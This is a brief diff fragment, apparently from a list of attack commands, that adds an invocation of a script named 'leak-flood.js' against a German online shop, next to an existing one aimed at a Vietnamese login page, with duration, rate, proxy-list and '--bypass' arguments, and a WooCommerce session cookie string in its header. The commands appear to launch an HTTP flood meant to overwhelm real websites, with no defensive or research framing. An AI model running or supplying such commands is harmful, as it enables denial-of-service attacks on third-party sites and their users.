@@ -13,3 +13,5 @@ pll_language=de; wp_woocommerce_session_56d84b7b4ca72c372043ca5a6d7d4d8f=t_6e972
 
 
 node leak-flood.js https://mb3.vendor-sit.nonprod.cardoctor.com.vn/login/ 60 5 2 500.txt --debug --reset --bypass
+
+node leak-flood.js https://bavarian-outfitters.de/ 60 5 2 1000_ger.txt --debug --reset --bypass
